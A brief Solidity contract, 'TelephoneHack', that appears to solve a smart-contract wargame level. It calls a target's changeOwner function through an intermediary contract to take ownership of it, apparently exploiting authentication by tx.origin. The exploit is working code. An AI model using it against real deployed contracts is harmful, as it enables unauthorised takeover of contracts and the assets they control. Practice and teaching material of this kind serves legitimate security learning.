// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {

    function changeOwner(ITelephone cont, address owner) public {
        cont.changeOwner(owner);
    }
}
